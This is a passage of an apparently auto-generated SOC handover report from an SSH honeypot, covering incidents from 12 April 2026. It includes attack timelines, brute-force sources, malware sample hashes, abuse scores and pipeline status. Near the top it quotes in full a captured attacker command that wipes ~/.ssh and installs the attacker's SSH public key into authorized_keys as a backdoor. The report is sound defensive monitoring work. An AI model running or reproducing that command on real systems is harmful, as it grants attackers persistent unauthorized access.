| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:51:43` | `cowrie.session.connect` |
| `2026-04-12 05:51:43` | `cowrie.client.version` |
| `2026-04-12 05:51:44` | `cowrie.client.kex` |
| `2026-04-12 05:51:44` | `cowrie.login.success` |
| `2026-04-12 05:51:45` | `cowrie.session.params` |
| `2026-04-12 05:51:45` | `cowrie.command.input` |
| `2026-04-12 05:51:45` | `cowrie.command.failed` |
| `2026-04-12 05:51:45` | `cowrie.log.closed` |
| `2026-04-12 05:51:46` | `cowrie.session.params` |
| `2026-04-12 05:51:46` | `cowrie.command.input` |
| `2026-04-12 05:51:46` | `cowrie.session.file_download` |
| `2026-04-12 05:51:46` | `cowrie.log.closed` |
| `2026-04-12 05:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcc509b9b3e5

| Field | Detail |
|---|---|
| **Source IP** | `197.153.57[.]103` |
| **First Seen** | 2026-04-12 05:51 |
| **Last Seen** | 2026-04-12 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-12 05:51:48` | `cowrie.session.connect` |
| `2026-04-12 05:51:48` | `cowrie.client.version` |
| `2026-04-12 05:51:49` | `cowrie.client.kex` |
| `2026-04-12 05:51:49` | `cowrie.login.success` |
| `2026-04-12 05:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.153.57[.]103` to AbuseIPDB if not already reported
- [ ] Block `197.153.57[.]103` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `123.139.116[.]220` | **25** | 2026-04-12 02:27 | 2026-04-12 02:59 | 39m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.79.191[.]199` | **25** | 2026-04-12 02:28 | 2026-04-12 03:12 | 0m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.204.183[.]232` | **17** | 2026-04-12 02:25 | 2026-04-12 03:28 | 1m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `90.25.145[.]86` | **8** | 2026-04-12 02:24 | 2026-04-12 02:35 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `197.153.57[.]103` | **6** | 2026-04-12 05:48 | 2026-04-12 05:52 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `69.149.23[.]135` | **5** | 2026-04-12 02:23 | 2026-04-12 02:29 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `79.45.101[.]239` | **2** | 2026-04-12 05:48 | 2026-04-12 05:51 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.126.11[.]137` | 1 | 2026-04-12 05:48 | 2026-04-12 05:48 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.140.97[.]134` | 1 | 2026-04-12 05:51 | 2026-04-12 05:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.210.148[.]92` | 1 | 2026-04-12 05:51 | 2026-04-12 05:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.127[.]233` | 1 | 2026-04-12 05:49 | 2026-04-12 05:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]66` | 1 | 2026-04-12 05:51 | 2026-04-12 05:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.76[.]234` | 1 | 2026-04-12 02:33 | 2026-04-12 02:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `20.153.204[.]5` | 1 | 2026-04-12 05:50 | 2026-04-12 05:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `222.109.205[.]160` | 1 | 2026-04-12 04:31 | 2026-04-12 04:31 | 13s | 0 | `T1592` | 🟢 LOW |
| `81.56.96[.]82` | 1 | 2026-04-12 02:49 | 2026-04-12 02:50 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `90.25.145[.]86` | FR | Orange S.A. | **100** ⚠️ | 6 |
| `81.56.96[.]82` | IT | Iliad / Free SAS | **100** ⚠️ | 21 |
| `102.140.97[.]134` | NG | FOR INTERNET | **100** ⚠️ | 50 |
| `79.45.101[.]239` | IT | Telecom Italia S.p.A. | **100** ⚠️ | 9 |
| `14.103.127[.]233` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `20.153.204[.]5` | JP | Microsoft Corporation | **100** ⚠️ | 21 |
| `123.139.116[.]220` | CN | China Unicom Shannxi province network | **100** ⚠️ | 50 |
| `69.149.23[.]135` | US | AT&T Enterprises, LLC | **100** ⚠️ | 50 |
| `210.79.191[.]199` | ID | PT Kebun Nara Santosa | **100** ⚠️ | 50 |
| `101.126.11[.]137` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 142 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 68 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 48 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |

---

## 🔕 False Positive Summary (3 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| AbuseIPDB score 21 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 148 cases |
| Tool 34  | Credential Extractor        | ✅ 116 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 19 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 3 filtered (2.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 16 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 22 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 48 priority case(s) shown individually · 16 recon entry/entries in table (7 group(s) consolidating 88 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-12T05:53:27Z_
